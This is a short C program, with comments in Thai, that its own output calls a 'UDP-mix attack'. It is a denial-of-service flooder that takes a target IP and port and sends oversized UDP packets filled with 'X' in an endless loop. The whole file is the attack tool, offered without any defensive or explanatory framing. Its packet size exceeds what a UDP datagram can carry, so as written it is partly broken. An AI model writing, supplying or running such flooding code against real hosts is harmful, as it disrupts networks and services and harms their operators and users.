#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PACKET_SIZE 100000

void send_udp_packet(int sockfd, struct sockaddr_in *target_addr) {
    char packet[PACKET_SIZE];
    memset(packet, 'X', PACKET_SIZE);  // กำหนดค่าข้อมูลในแพ็กเก็ต

    if (sendto(sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *) target_addr, sizeof(*target_addr)) == -1) {
        perror("sendto failed");
        exit(1);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    int sockfd;
    struct sockaddr_in target_addr;
    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    // สร้าง socket UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(1);
    }

    // กำหนดค่า target address (IP และ Port)
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);

    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("invalid address or address not supported");
        exit(1);
    }

    printf("Starting UDP-mix attack on %s:%d...\n", target_ip, target_port);

    while (1) {
        send_udp_packet(sockfd, &target_addr);
    }

    // ปิด socket (จะไม่ถึงที่นี้เพราะโปรแกรมทำงานตลอดเวลา)
    close(sockfd);
    return 0;
}
